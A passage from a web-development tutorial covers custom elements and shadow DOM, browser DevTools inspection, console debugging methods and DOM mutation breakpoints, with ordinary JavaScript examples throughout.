await customElements.whenDefined('my-element');
// Now safe to interact with the element's custom API
```

The upgrade process runs synchronously when `define()` is called, potentially causing performance issues if many elements need upgrading simultaneously.

### Constructor Restrictions

The constructor has specific restrictions to ensure elements can be created in various contexts:

- Must call `super()` before accessing `this`
- Cannot return a different object (except `this`)
- Cannot use `document.write()` or `document.open()`
- Cannot inspect parent or sibling elements (not yet in DOM tree)
- Cannot add attributes or children (should be done in `connectedCallback`)

```javascript
// Valid constructor
constructor() {
  super();
  this._data = [];
  this._setupInternalState();
}

// Invalid - adds attributes
constructor() {
  super();
  this.setAttribute('initialized', ''); // Don't do this
}
```

### Extending Custom Elements

Custom elements can be extended to create element hierarchies:

```javascript
class BaseElement extends HTMLElement {
  connectedCallback() {
    this.classList.add('base');
  }
}

class ExtendedElement extends BaseElement {
  connectedCallback() {
    super.connectedCallback(); // Call parent behavior
    this.classList.add('extended');
  }
}

customElements.define('base-element', BaseElement);
customElements.define('extended-element', ExtendedElement);
```

The subclass must call `super.connectedCallback()` and other lifecycle methods if it wants to preserve parent behavior.

### Form Association

Custom elements can participate in forms using the `ElementInternals` API:

```javascript
class FormInput extends HTMLElement {
  static formAssociated = true;

  constructor() {
    super();
    this._internals = this.attachInternals();
  }

  connectedCallback() {
    this.addEventListener('input', (e) => {
      this._internals.setFormValue(e.target.value);
    });
  }

  // Form lifecycle callbacks
  formResetCallback() {
    this._internals.setFormValue('');
  }

  formDisabledCallback(disabled) {
    this.toggleAttribute('disabled', disabled);
  }
}
```

The `ElementInternals` interface provides:

- `setFormValue()` - sets the element's value for form submission
- `setValidity()` - sets custom validation state
- `form` - reference to the associated form
- `validity` - ValidityState object
- `willValidate` - whether element participates in validation

Form-associated custom elements also receive `formResetCallback()`, `formDisabledCallback()`, `formStateRestoreCallback()`, and `formAssociatedCallback()` lifecycle methods.

### Custom Pseudo-classes and States

Using `ElementInternals`, custom elements can expose custom states that can be styled with CSS:

```javascript
class ToggleSwitch extends HTMLElement {
  static formAssociated = true;

  constructor() {
    super();
    this._internals = this.attachInternals();
  }

  set checked(value) {
    if (value) {
      this._internals.states.add('checked');
    } else {
      this._internals.states.delete('checked');
    }
  }
}

customElements.define('toggle-switch', ToggleSwitch);
```

```css
toggle-switch:state(checked) {
  background: green;
}
```

[Unverified] The `:state()` pseudo-class has limited browser support and may require prefixes or polyfills in some environments.

### Slot Change Detection

When using Shadow DOM with slots, you can detect when slotted content changes:

```javascript
class ContainerElement extends HTMLElement {
  constructor() {
    super();
    this.attachShadow({ mode: 'open' });
    this.shadowRoot.innerHTML = `
      <slot name="header"></slot>
      <slot></slot>
    `;
    
    this.shadowRoot.querySelector('slot[name="header"]')
      .addEventListener('slotchange', (e) => {
        const nodes = e.target.assignedNodes();
        this.handleHeaderChange(nodes);
      });
  }
}
```

The `slotchange` event fires when the slot's assigned nodes change. Use `assignedNodes()` to get text nodes and elements, or `assignedElements()` to get only elements. Both accept an optional `{ flatten: true }` parameter to get nodes from nested slots.

### Reflection and Attributes

Custom elements commonly reflect JavaScript properties to HTML attributes and vice versa:

```javascript
class ReflectiveElement extends HTMLElement {
  static get observedAttributes() {
    return ['value'];
  }

  get value() {
    return this.getAttribute('value') || '';
  }

  set value(val) {
    this.setAttribute('value', val);
  }

  attributeChangedCallback(name, oldValue, newValue) {
    if (name === 'value' && oldValue !== newValue) {
      this.dispatchEvent(new CustomEvent('valuechange', {
        detail: { value: newValue }
      }));
    }
  }
}
```

For boolean attributes, follow the HTML convention:

```javascript
get disabled() {
  return this.hasAttribute('disabled');
}

set disabled(val) {
  if (val) {
    this.setAttribute('disabled', '');
  } else {
    this.removeAttribute('disabled');
  }
}
```

### Preventing Duplicate Definitions

Attempting to register the same tag name twice throws a `DOMException`. Check if an element is already defined:

```javascript
if (!customElements.get('my-element')) {
  customElements.define('my-element', MyElement);
}
```

This pattern is useful in module systems where the same definition might be imported multiple times, or when loading components conditionally.

### Memory Management and Cleanup

Proper cleanup in `disconnectedCallback` prevents memory leaks:

```javascript
class TimerElement extends HTMLElement {
  connectedCallback() {
    this._interval = setInterval(() => {
      this.textContent = new Date().toISOString();
    }, 1000);
    
    this._handleClick = () => console.log('clicked');
    document.addEventListener('click', this._handleClick);
  }

  disconnectedCallback() {
    clearInterval(this._interval);
    document.removeEventListener('click', this._handleClick);
  }
}
```

Store references to intervals, timeouts, and bound event handlers so they can be cleaned up. Be especially careful with event listeners on `window`, `document`, or parent elements, as these will keep the element alive even after removal from the DOM.

### Accessing Light DOM vs Shadow DOM

Custom elements have access to both light DOM (their children) and shadow DOM (encapsulated content):

```javascript
class DualAccessElement extends HTMLElement {
  constructor() {
    super();
    this.attachShadow({ mode: 'open' });
  }

  connectedCallback() {
    // Light DOM - direct children
    const lightChildren = Array.from(this.children);
    
    // Shadow DOM - encapsulated content
    this.shadowRoot.innerHTML = '<slot></slot>';
    const shadowContent = this.shadowRoot.querySelector('slot');
    
    // Slotted nodes - light DOM children assigned to slots
    const slotted = shadowContent.assignedElements();
  }
}
```

The shadow root creates a boundary: CSS selectors from the outside don't reach in, and selectors from inside don't reach out. The `<slot>` element projects light DOM content into the shadow tree.

### Custom Element Naming Conventions

Valid custom element names must:

- Contain at least one hyphen (-)
- Start with a lowercase ASCII letter
- Not contain uppercase ASCII letters
- Not be one of the reserved names

Reserved names include: `annotation-xml`, `color-profile`, `font-face`, `font-face-src`, `font-face-uri`, `font-face-format`, `font-face-name`, and `missing-glyph`.

```javascript
// Valid names
customElements.define('my-button', MyButton);
customElements.define('x-component-v2', ComponentV2);
customElements.define('my-app', MyApp);

// Invalid names - will throw
customElements.define('mybutton', MyButton); // No hyphen
customElements.define('My-Button', MyButton); // Uppercase
```

### Performance Considerations

**[Inference]** Custom elements introduce performance overhead in several areas:

**Upgrade cost** - When `define()` is called, all matching undefined elements in the DOM upgrade synchronously. For large DOMs, defer registration until needed or use lazy loading.

**Constructor execution** - Runs for every element instance. Keep constructors lightweight; defer expensive operations to `connectedCallback`.

**Attribute observation** - Each observed attribute that changes triggers `attributeChangedCallback`. Minimize the `observedAttributes` array and batch attribute changes.

**Shadow DOM overhead** - Each shadow root adds memory and rendering cost. For simple components, consider using light DOM only.

```javascript
// Defer expensive work
class OptimizedElement extends HTMLElement {
  connectedCallback() {
    // Fast: just flag for later
    this._needsSetup = true;
    requestIdleCallback(() => this._expensiveSetup());
  }

  _expensiveSetup() {
    if (!this._needsSetup) return;
    this._needsSetup = false;
    // Expensive operations here
  }
}
```

### Event Handling Patterns

Custom elements should follow standard event patterns, dispatching events that bubble and can be canceled:

```javascript
class InteractiveElement extends HTMLElement {
  _handleAction() {
    const event = new CustomEvent('action', {
      bubbles: true,
      cancelable: true,
      composed: true, // Cross shadow boundary
      detail: { timestamp: Date.now() }
    });

    const allowed = this.dispatchEvent(event);
    if (allowed) {
      this._performAction();
    }
  }
}
```

The `composed: true` flag allows the event to cross shadow DOM boundaries, making it visible to listeners on ancestor elements outside the shadow tree.

For form-related events, dispatch events that match native element behavior:

```javascript
class CustomInput extends HTMLElement {
  _handleInput(value) {
    // Dispatch standard events
    this.dispatchEvent(new Event('input', { bubbles: true }));
    this.dispatchEvent(new Event('change', { bubbles: true }));
  }
}
```

### CSS Custom Properties (CSS Variables) and Theming

Shadow DOM CSS is isolated, but CSS custom properties pierce the shadow boundary, enabling theming:

```javascript
class ThemedElement extends HTMLElement {
  constructor() {
    super();
    this.attachShadow({ mode: 'open' });
    this.shadowRoot.innerHTML = `
      <style>
        :host {
          background: var(--element-bg, white);
          color: var(--element-color, black);
          border: 1px solid var(--element-border, gray);
        }
      </style>
      <slot></slot>
    `;
  }
}
```

```css
/* External stylesheet can theme the element */
themed-element {
  --element-bg: #f0f0f0;
  --element-color: #333;
  --element-border: #ccc;
}
```

The `:host` selector targets the custom element itself from within the shadow DOM. `:host()` accepts a selector to conditionally style the host, and `:host-context()` styles based on ancestors (though browser support varies).

### Part and Exportparts

The `part` attribute exposes shadow DOM elements for external styling:

```javascript
this.shadowRoot.innerHTML = `
  <style>
    .header { font-weight: bold; }
  </style>
  <div part="header" class="header">
    <slot name="title"></slot>
  </div>
  <div part="body">
    <slot></slot>
  </div>
`;
```

```css
/* External stylesheet can style parts */
my-element::part(header) {
  color: blue;
  background: yellow;
}
```

Nested custom elements can export their parts upward:

```html
<parent-element>
  <child-element exportparts="header: child-header"></child-element>
</parent-element>
```

```css
parent-element::part(child-header) {
  /* Styles child's header part through parent */
}
```

### Accessibility Considerations

Custom elements must implement proper accessibility:

```javascript
class AccessibleButton extends HTMLElement {
  connectedCallback() {
    // Add ARIA role if not natively semantic
    if (!this.hasAttribute('role')) {
      this.setAttribute('role', 'button');
    }

    // Make focusable
    if (!this.hasAttribute('tabindex')) {
      this.setAttribute('tabindex', '0');
    }

    // Handle keyboard interaction
    this.addEventListener('keydown', (e) => {
      if (e.key === 'Enter' || e.key === ' ') {
        e.preventDefault();
        this.click();
      }
    });
  }
}
```

**[Inference]** For complex widgets, using customized built-in elements often provides better accessibility "for free" since native elements include proper roles, keyboard handling, and screen reader support. However, this requires weighing browser support tradeoffs.

Ensure shadow DOM content is accessible:

```javascript
this.shadowRoot.innerHTML = `
  <button part="button" aria-label="${this.getAttribute('label')}">
    <slot></slot>
  </button>
`;
```

### Template Cloning and Efficiency

Using `<template>` elements improves performance when creating multiple instances:

```javascript
const template = document.createElement('template');
template.innerHTML = `
  <style>
    :host { display: block; }
  </style>
  <div class="container">
    <slot></slot>
  </div>
`;

class TemplatedElement extends HTMLElement {
  constructor() {
    super();
    this.attachShadow({ mode: 'open' });
    // Clone template content (faster than innerHTML)
    this.shadowRoot.appendChild(template.content.cloneNode(true));
  }
}
```

Template cloning is significantly faster than setting `innerHTML` repeatedly because the browser parses the content once and reuses the parsed structure.

### Declarative Shadow DOM

**[Unverified browser support status]** Declarative Shadow DOM allows server-side rendering of shadow roots:

```html
<my-element>
  <template shadowrootmode="open">
    <style>
      :host { display: block; }
    </style>
    <slot></slot>
  </template>
  Light DOM content
</my-element>
```

The browser automatically attaches the shadow root from the template. The custom element can detect and use this existing shadow root:

```javascript
class SSRElement extends HTMLElement {
  constructor() {
    super();
    // Shadow root may already exist from declarative SD
    if (!this.shadowRoot) {
      this.attachShadow({ mode: 'open' });
      // Setup content
    }
  }
}
```

This enables progressive enhancement where the element works before JavaScript loads.

### Dynamic Module Loading

Custom elements can be loaded dynamically to reduce initial bundle size:

```javascript
// Lazy registration
class LazyElement extends HTMLElement {
  connectedCallback() {
    if (!this._initialized) {
      this._initialized = true;
      this.textContent = 'Loading...';
      import('./heavy-component.js').then(module => {
        customElements.define('heavy-component', module.HeavyComponent);
      });
    }
  }
}

customElements.define('lazy-element', LazyElement);
```

Or use Intersection Observer to register when elements enter viewport:

```javascript
const observer = new IntersectionObserver((entries) => {
  entries.forEach(entry => {
    if (entry.isIntersecting) {
      import('./component.js').then(module => {
        customElements.define('lazy-component', module.Component);
      });
      observer.disconnect();
    }
  });
});

document.querySelectorAll('lazy-component').forEach(el => {
  observer.observe(el);
});
```

### Custom Built-in Element Considerations

**[Unverified]** WebKit/Safari has historically resisted implementing customized built-in elements, requiring fallback strategies:

```javascript
// Feature detection
if ('customElements' in window && customElements.define.length > 2) {
  // Supports customized built-ins
  customElements.define('fancy-button', FancyButton, { extends: 'button' });
} else {
  // Fallback to autonomous element
  class FancyButtonAutonomous extends HTMLElement {
    constructor() {
      super();
      const button = document.createElement('button');
      button.textContent = this.textContent;
      this.appendChild(button);
    }
  }
  customElements.define('fancy-button', FancyButtonAutonomous);
}
```

### State Management Patterns

Custom elements can implement various state management approaches:

**Internal state:**

```javascript
class StatefulElement extends HTMLElement {
  #state = { count: 0 };

  get state() {
    return { ...this.#state };
  }

  setState(updates) {
    this.#state = { ...this.#state, ...updates };
    this.render();
  }

  render() {
    this.shadowRoot.querySelector('#count').textContent = this.#state.count;
  }
}
```

**Observable pattern:**

```javascript
class ObservableElement extends HTMLElement {
  constructor() {
    super();
    this._listeners = new Set();
  }

  subscribe(callback) {
    this._listeners.add(callback);
    return () => this._listeners.delete(callback);
  }

  _notify() {
    this._listeners.forEach(cb => cb(this.state));
  }

  updateState(changes) {
    Object.assign(this._state, changes);
    this._notify();
  }
}
```

### Testing Strategies

Custom elements require specific testing approaches:

```javascript
// Test element registration
describe('MyElement', () => {
  it('should be defined', () => {
    expect(customElements.get('my-element')).toBeDefined();
  });

  it('should create instance', () => {
    const el = document.createElement('my-element');
    expect(el).toBeInstanceOf(MyElement);
  });

  it('should render content when connected', async () => {
    const el = document.createElement('my-element');
    document.body.appendChild(el);
    
    // Wait for lifecycle to complete
    await customElements.whenDefined('my-element');
    await new Promise(resolve => setTimeout(resolve, 0));
    
    expect(el.shadowRoot.textContent).toContain('Expected content');
    
    el.remove();
  });
});
```

Always clean up by removing test elements from the DOM to prevent interference between tests.

---

# Testing and Debugging

## Browser DevTools for DOM Inspection

### Inspecting Elements

The Elements/Inspector panel provides real-time DOM tree visualization. Clicking the inspect icon (or Ctrl+Shift+C / Cmd+Opt+C) enables element picker mode, highlighting elements on hover and selecting them on click. The DOM tree displays with syntax highlighting: tags in purple/blue, attributes in orange, text nodes in black.

Right-clicking any element in the tree reveals contextual operations: Edit as HTML, Delete Element, Duplicate Element, Copy (selector, XPath, element, outerHTML), Hide Element, Scroll into View, Store as Global Variable, and Break On (subtree modifications, attribute modifications, node removal).

### Live DOM Manipulation

Double-clicking tag names, attributes, or text content enables inline editing. Changes apply immediately to the rendered page but don't persist on reload. The "Edit as HTML" option allows multi-line editing of entire subtrees, useful for testing layout changes or injecting temporary content.

Dragging elements within the tree repositions them in the DOM hierarchy. Delete key removes selected elements. These modifications affect computed styles, event listeners, and JavaScript references to those nodes.

### DOM Breakpoints

DevTools supports three breakpoint types on DOM nodes:

**Subtree modifications**: Triggers when child nodes are added, removed, or reordered beneath the selected element. Catches operations like `appendChild()`, `removeChild()`, `insertBefore()`, and `innerHTML` assignments affecting descendants.

**Attribute modifications**: Pauses execution when any attribute changes on the selected element via `setAttribute()`, `removeAttribute()`, direct property assignment, or className manipulation.

**Node removal**: Breaks when the specific element is removed from the DOM through `remove()`, `removeChild()`, or parent innerHTML replacement.

When a breakpoint triggers, execution pauses in the Sources panel with the call stack visible, showing exactly which code modified the DOM.

### Computed Styles Panel

The Computed tab displays the final calculated styles for selected elements after cascade resolution. Properties are alphabetically sorted by default, showing the actual computed values (e.g., "16px" instead of "1em"). Each property expands to reveal its source: which stylesheet rule and specificity determined the final value.

The "Show All" checkbox includes browser default styles. The filter box accepts property names or values. Clicking the arrow next to any property jumps to its declaration in the Styles panel.

Box model visualization displays content, padding, border, and margin dimensions with pixel values. Hovering over these values highlights the corresponding regions on the page. Double-clicking dimensions enables inline editing.

### Styles Panel

Lists all CSS rules matching the selected element in specificity order. Inline styles appear first, followed by stylesheet rules from most to least specific. Crossed-out properties indicate they've been overridden by higher-specificity rules.

Checkboxes toggle individual declarations on/off. Clicking property names or values enables editing. The `+` button adds new rules with auto-generated selectors. The `:hov` button forces pseudo-states (:hover, :active, :focus, :visited, :focus-within) for testing interactive styles.

Color values display with inline swatches; clicking opens a color picker with eyedropper functionality. Length values show adjustment controls (up/down arrows or mouse wheel). The computed value appears on hover for relative units.

Source links on the right jump to the declaration's location in the Sources panel. For minified CSS, DevTools can pretty-print and map back to original sources with source maps.

### Accessibility Tree

The Accessibility panel shows the parallel accessibility tree exposed to assistive technologies. This differs from the DOM tree—some elements are omitted, others merged, and ARIA attributes can override semantic meanings.

Each node displays its role, name, description, and properties as screen readers perceive them. The panel highlights accessibility issues: missing labels, insufficient contrast ratios, improper heading hierarchies, or invalid ARIA usage.

The contrast ratio checker appears when text is selected, showing foreground/background contrast with AA and AAA WCAG compliance indicators. Simulating vision deficiencies (protanopia, deuteranopia, tritanopia, achromatopsia) previews the page under color blindness conditions.

### Event Listeners Panel

Lists all event listeners attached to the selected element and its ancestors (accounting for event bubbling). Grouped by event type (click, mouseover, DOMContentLoaded), each listener shows:

- Handler function preview
- Registration location (file:line:column)
- Whether it's capturing/bubbling
- Passive/once flags
- Bound context

Framework-wrapped listeners often obscure the actual handler; the "Show framework listeners" option reveals internal event delegation systems. Clicking the source location navigates to the handler definition.

The "Remove" option (right-click menu) detaches specific listeners for debugging. The Ancestors checkbox toggles display of inherited listeners from parent elements.

### Properties Panel

Displays the complete JavaScript object representation of the selected DOM node. All properties—standard DOM APIs and any custom properties added by JavaScript—appear in an expandable tree structure.

Useful for inspecting:

- Dataset attributes (`element.dataset`)
- Attached event handlers (`onclick`, `addEventListener` results stored in properties)
- Custom properties added by frameworks
- Shadow DOM roots (`element.shadowRoot`)
- Form element values and validity states
- Internal browser properties (prefixed with `[[]]`)

Right-clicking properties allows copying values or storing references as global variables for console manipulation.

### Shadow DOM Inspection

Shadow DOM appears in the tree with a `#shadow-root` node. The type (open/closed) is indicated, though DevTools can inspect both. Shadow roots display their own encapsulated DOM trees and styles.

The "Show user agent shadow DOM" setting reveals browser-internal shadow DOM for elements like `<video>`, `<input type="range">`, and `<details>`. These show the actual implementation of complex controls.

Styles within shadow DOM respect encapsulation—selectors don't leak out, and external styles (except inherited properties and CSS custom properties) don't leak in. The Styles panel clearly indicates which styles come from shadow versus light DOM contexts.

### Layout Panel

Displays active layout modes (Flexbox, Grid, Box Model) for the selected element. When Grid or Flexbox is detected:

**Grid overlays**: Show grid lines, track sizes, gap spacing, line numbers, and area names directly on the page. Colors are customizable. Multiple grids can be overlaid simultaneously.

**Flexbox overlays**: Highlight flex containers and items, showing main/cross axis directions, alignment, and spacing. Visualizes flex-grow, flex-shrink, and flex-basis calculations.

The Layout panel includes controls for toggling these overlays and adjusting display options (line numbers, track sizing, extended grid lines). Selecting multiple elements with layout properties enables comparative visualization.

### Search and Navigation

Ctrl+F / Cmd+F within the Elements panel searches across the entire DOM tree, matching element names, attributes, text content, and even CSS selectors. Results highlight in the tree, and arrow keys cycle through matches.

The breadcrumb trail (bottom of Elements panel in some browsers, top in others) shows the ancestry chain from `<html>` to the selected element. Clicking ancestors navigates upward. Scrolling reveals additional ancestors when the chain is long.

Console API integration: `$0` references the currently selected element, `$1` through `$4` reference the four previously selected elements. `inspect(element)` selects any element in the DevTools tree from console commands.

### Performance Considerations for Inspection

Opening DevTools impacts page performance. The browser maintains shadow structures for DevTools state tracking, especially with many DOM breakpoints or persistent console logs. On complex applications, DevTools can consume significant memory.

Inspecting elements during active animations or rapid DOM updates may cause inspection lag or UI freezes. Pausing JavaScript execution (Sources panel) before inspecting dynamic content often improves responsiveness.

Large DOM trees (10,000+ nodes) render slowly in the Elements panel. Collapsing subtrees, using search to navigate directly to targets, or temporarily hiding large sections improves navigation speed.

### Browser-Specific Features

**Chrome/Edge**: Layers panel visualizes compositing layers and repaint regions. Rendering panel includes paint flashing, layout shift regions, and Core Web Vitals overlays.

**Firefox**: Fonts panel shows all fonts used on the page with specimen previews. Layout panel includes specialized Flex/Grid debugging with more detailed property explanations.

**Safari**: Elements tab includes Animation timeline for CSS animations and transitions. Audit tab provides accessibility and performance recommendations specific to inspected elements.

### Workflow Optimizations

Keyboard shortcuts accelerate inspection:

- Arrow keys navigate the tree
- H key hides/shows selected elements
- Delete removes elements
- F2 edits as HTML
- Ctrl+Z / Cmd+Z undoes DOM changes

Organizing workspace: Detaching DevTools to a separate window, using vertical split for narrow viewport testing, or using device mode for responsive inspection alongside DOM tree navigation.

Creating live expressions in Console for monitoring specific element properties during interaction (e.g., `$0.scrollTop`, `$0.getBoundingClientRect()`).

---

## Console Methods for DOM Debugging

### Interactive Element Inspection

**`$0` through `$4`** reference the last five elements inspected in the Elements panel. `$0` is the most recent, `$4` the oldest. These persist across console commands within the same session.

```javascript
$0.classList.add('highlight');
$0.getBoundingClientRect();
```

**`inspect(element)`** opens the Elements panel and focuses on the specified DOM node. Useful when you have a reference to an element programmatically but need to see it in the DOM tree.

```javascript
const problematicDiv = document.querySelector('.broken-layout');
inspect(problematicDiv);
```

### Element Selection Shortcuts

**`$(selector)`** is an alias for `document.querySelector()`. Returns the first matching element.

**`$$(selector)`** returns an array of all matching elements (not a NodeList), making array methods immediately available without conversion.

```javascript
$$('.menu-item').forEach(item => console.log(item.textContent));
$$('.menu-item').map(item => item.dataset.id);
```

**`$x(xpath)`** evaluates an XPath expression and returns matching nodes as an array.

```javascript
$x("//button[contains(text(), 'Submit')]")
$x("//div[@class='container']//a")
```

### Event Monitoring

**`monitorEvents(element, [events])`** logs all events (or specified event types) fired on an element to the console. Without the second parameter, logs all events.

```javascript
monitorEvents($0); // Monitor all events on selected element
monitorEvents(window, ['resize', 'scroll']);
monitorEvents($('.form'), ['focus', 'blur', 'input']);
```

**`unmonitorEvents(element, [events])`** stops event monitoring.

**`getEventListeners(element)`** returns an object containing arrays of event listeners registered on the element, organized by event type. Shows the listener function, whether it uses capture, passive status, and more.

```javascript
getEventListeners($0);
// Returns: { click: Array(2), mouseover: Array(1), ... }

getEventListeners(document).DOMContentLoaded.forEach(listener => {
  console.log(listener.listener.toString());
});
```

### DOM Mutation Observation

**`monitor(function)`** logs a message to the console whenever the specified function is called, showing the function name and arguments passed.

```javascript
monitor(myElement.addEventListener);
```

**`unmonitor(function)`** stops monitoring the function.

### Property and Method Inspection

**`dir(element)`** displays an interactive property list of the element object, showing all properties and methods (not just the DOM representation). More comprehensive than `console.log()` for examining what's available on an object.

```javascript
dir($0); // Shows all properties/methods of selected element
```

**`keys(object)`** returns an array of property names. **`values(object)`** returns an array of property values.

```javascript
keys($0.dataset); // ['userId', 'itemId', 'active']
values($0.style); // CSS property values
```

### Table Visualization

**`console.table(data, [columns])`** displays array or object data in tabular format. The optional columns parameter specifies which properties to display.

```javascript
console.table($$('.product').map(el => ({
  name: el.querySelector('.name').textContent,
  price: el.querySelector('.price').textContent,
  stock: el.dataset.stock
})));

console.table($$('a'), ['href', 'textContent']);
```

### Query Performance

**`console.time(label)`** and **`console.timeEnd(label)`** measure execution time of operations between the calls.

```javascript
console.time('querySelector');
document.querySelector('.complex > .selector > .chain');
console.timeEnd('querySelector');

console.time('getElementById');
document.getElementById('simple');
console.timeEnd('getElementById');
```

**`console.timeLog(label, [data])`** logs the elapsed time at an intermediate point without ending the timer.

### Memory and Performance Profiling

**`console.profile([label])`** starts a JavaScript CPU profile. **`console.profileEnd([label])`** stops it and displays results in the Profiler panel.

```javascript
console.profile('DOMOperations');
for(let i = 0; i < 1000; i++) {
  document.body.appendChild(document.createElement('div'));
}
console.profileEnd('DOMOperations');
```

**`console.count(label)`** logs the number of times it's been called with that label. **`console.countReset(label)`** resets the counter.

```javascript
$$('.item').forEach(item => {
  if(item.classList.contains('active')) {
    console.count('active items');
  }
});
```

### Copy and Clear

**`copy(object)`** copies the string representation of the object to the clipboard. Particularly useful for extracting data from the page.

```javascript
copy($$('.email').map(el => el.textContent));
copy(JSON.stringify(myDataObject, null, 2));
```

**`clear()`** clears the console history.

### Grouping Output

**`console.group(label)`** and **`console.groupCollapsed(label)`** create collapsible groups in the console. **`console.groupEnd()`** closes the current group.

```javascript
$$('.section').forEach(section => {
  console.group(section.querySelector('h2').textContent);
  console.log('Elements:', section.querySelectorAll('*').length);
  console.log('Text length:', section.textContent.length);
  console.groupEnd();
});
```

### Conditional Logging

**`console.assert(condition, message)`** only logs when the condition is false. Useful for validating DOM state assumptions.

```javascript
console.assert($('.required-element'), 'Required element missing');
console.assert($$('.item').length === 10, 'Expected 10 items, found', $$('.item').length);
```

### Trace and Context

**`console.trace([label])`** outputs a stack trace showing how execution reached that point. Valuable for understanding event propagation or function call chains.

```javascript
element.addEventListener('click', () => {
  console.trace('Click handler called');
});
```

**`console.dir(element, {depth: null})`** in Node.js-style environments shows full object depth. [Inference: Browser console implementations vary in whether they accept the depth parameter]

### Debug and Breakpoint Control

**`debug(function)`** sets a breakpoint on the function's first line. When the function is called, the debugger pauses there. **`undebug(function)`** removes the breakpoint.

```javascript
debug(myEventHandler);
```

**`debugger;`** statement (not a console method, but related) explicitly pauses execution when DevTools is open.

### Live Expressions

Modern DevTools support "Live Expressions" (typically via a dedicated UI button) that continuously evaluate and display an expression's value. Useful for monitoring values that change as you interact with the page.

```javascript
// Examples of expressions to monitor live:
document.querySelectorAll('.active').length
window.scrollY
$0.getBoundingClientRect().top
```

### QuerySelector Performance Comparison

```javascript
console.time('Native');
document.querySelectorAll('.class');
console.timeEnd('Native');

console.time('$$ helper');
$$('.class');
console.timeEnd('$$ helper');
```

[Inference: The $$ helper typically has negligible overhead compared to native methods as it's a thin wrapper]

### Batch Element Analysis

```javascript
// Analyze all images on page
console.table($$('img').map(img => ({
  src: img.src,
  width: img.naturalWidth,
  height: img.naturalHeight,
  loaded: img.complete,
  visible: img.offsetParent !== null
})));

// Find elements without required attributes
$$('button').filter(btn => !btn.hasAttribute('aria-label')).forEach(inspect);

// Memory impact estimation
console.log('Total nodes:', document.querySelectorAll('*').length);
console.log('Event listeners:', Object.keys(getEventListeners(document)).length);
```

### Style Computation Debugging

```javascript
// Get computed styles efficiently
const computed = getComputedStyle($0);
console.table({
  display: computed.display,
  position: computed.position,
  zIndex: computed.zIndex,
  width: computed.width,
  height: computed.height
});

// Find style inheritance chain
let element = $0;
console.group('Style inheritance');
while(element) {
  console.log(element.tagName, getComputedStyle(element).display);
  element = element.parentElement;
}
console.groupEnd();
```

### Event Listener Audit

```javascript
// Find all elements with click handlers
$$('*').filter(el => {
  const listeners = getEventListeners(el);
  return listeners.click && listeners.click.length > 0;
}).forEach(el => {
  console.log(el, getEventListeners(el).click);
});

// Count total event listeners
let totalListeners = 0;
$$('*').forEach(el => {
  const listeners = getEventListeners(el);
  totalListeners += Object.values(listeners).reduce((sum, arr) => sum + arr.length, 0);
});
console.log('Total event listeners:', totalListeners);
```

---

## Breakpoints in DOM Manipulation

### DOM Mutation Breakpoints

DOM mutation breakpoints pause JavaScript execution when specific changes occur to DOM elements. Modern browsers provide three primary types:

**Subtree Modifications** Triggers when any descendant node is added or removed from the target element. This captures appendChild, removeChild, innerHTML changes, and any DOM insertion/removal methods affecting children at any nesting level.

**Attribute Modifications** Fires when attributes on the target element change through setAttribute, removeAttribute, direct property assignment (element.className), or attribute manipulation via dataset. This includes style attribute changes but not direct style property modifications (element.style.color).

**Node Removal** Activates when the specific element itself is removed from the DOM tree. This breakpoint moves with the element if it's reattached, remaining active until explicitly disabled.

### Setting DOM Breakpoints

**Chrome DevTools** Right-click the element in the Elements panel → Break on → select breakpoint type. Active breakpoints display a blue marker. The Sources panel shows all active DOM breakpoints with their target elements and types.

**Firefox Developer Tools** Right-click in Inspector → Break on → choose modification type. The Debugger panel lists active breakpoints under "DOM Mutation Breakpoints" with element identifiers.

**Edge DevTools** Identical to Chrome implementation. Right-click element → Break on → subtree modifications/attribute modifications/node removal.

### Execution Behavior

When a DOM breakpoint triggers:

1. JavaScript execution pauses before the modification completes
2. The call stack shows the exact function chain leading to the change
3. Scope variables are accessible for inspection
4. The DOM reflects the state immediately before the modification
5. Step controls allow proceeding through or over the modification

**Critical timing**: The breakpoint fires in the synchronous code path that initiated the change, not in any subsequent rendering or layout calculations.

### Practical Debugging Scenarios

**Tracking Unwanted DOM Changes** When elements disappear, reposition, or change unexpectedly, set subtree or node removal breakpoints on parent containers. The call stack reveals which library, framework code, or event handler initiated the change.

**Attribute Manipulation Chains** For CSS class toggles or data attribute changes affecting UI state, attribute breakpoints expose the modification sequence. Examine the call stack to trace through event handlers, framework reactivity systems, or animation libraries.

**Dynamic Content Insertion** Subtree breakpoints on container elements reveal when and how content loads asynchronously. This exposes AJAX callback chains, template rendering, or framework component mounting.

### Framework-Specific Considerations

**React** DOM breakpoints trigger during the commit phase after reconciliation. The call stack shows React internals (commitWork, commitMutationEffects) before reaching your component code. Setting breakpoints on container elements reveals which component updates caused re-renders.

**Vue** Breakpoints fire during the patch process. The call stack includes Vue's patch functions before your component logic. Attribute breakpoints effectively track reactive property changes that trigger template updates.

**Angular** DOM changes occur during change detection cycles. Breakpoints expose the change detection chain, showing which component triggered detection and the sequence of DOM updates.

**Vanilla JavaScript** Direct DOM manipulation creates clean call stacks pointing to your exact modification code without framework layers.

### Performance Implications

Active DOM breakpoints impose minimal overhead until triggered. Browsers optimize breakpoint checking at the native code level. However:

- Multiple breakpoints on high-frequency modification targets (animations, scroll handlers) cause repeated pauses
- Subtree breakpoints on large DOM trees check extensive node lists
- Breakpoints remain active across page navigations in single-page applications

**[Inference]** The performance impact during normal execution (when breakpoints don't trigger) is negligible compared to the debugging value.

### Conditional DOM Breakpoint Strategies

Browsers don't natively support conditional DOM breakpoints. Workarounds:

**Script-Based Breakpoints** Wrap DOM manipulation in functions containing conditional debugger statements:

```javascript
function conditionalModify(element, condition) {
  if (condition) debugger;
  element.appendChild(newNode);
}
```

**Event Listener Breakpoints Combined** Set both DOM and event listener breakpoints to narrow trigger conditions. The event breakpoint fires first, allowing inspection before DOM changes.

**Logpoint Alternatives** Use logpoints (non-breaking logging breakpoints) to track modifications without pausing, then add breaking DOM breakpoints after identifying patterns.

### Limitations and Edge Cases

**Shadow DOM** DOM breakpoints on shadow root elements work, but subtree breakpoints don't traverse across shadow boundaries. Set separate breakpoints on shadow root contents.

**Document Fragments** Modifications to detached document fragments don't trigger breakpoints. Breakpoints activate only when fragments attach to the live DOM tree.

**innerHTML and outerHTML** These operations trigger subtree modification breakpoints but provide limited call stack information since the browser's HTML parser performs the actual DOM construction.

**CSS Animations and Transitions** Style changes via CSS animations don't trigger attribute breakpoints since no JavaScript directly modifies attributes. Use animation event listeners or computed style monitoring instead.

